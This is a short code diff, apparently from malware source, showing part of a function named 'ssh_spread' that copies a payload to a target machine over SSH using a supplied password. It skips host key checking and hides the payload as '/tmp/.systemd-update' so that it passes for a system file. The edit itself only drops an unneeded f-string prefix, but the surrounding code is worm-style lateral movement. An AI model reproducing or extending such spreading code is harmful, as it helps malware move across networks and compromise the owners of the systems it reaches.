@@ -65,7 +65,7 @@ def ssh_spread(protocol, target_ip, username, password, payload_path):
 
     protocol.send(f'[*] SSH spread to {target_ip}')
     try:
-        remote_path = f'/tmp/.systemd-update'
+        remote_path = '/tmp/.systemd-update'
         subprocess.run(
             ['sshpass', '-p', password, 'scp', '-o', 'StrictHostKeyChecking=no',
              payload_path, f'{username}@{target_ip}:{remote_path}'],
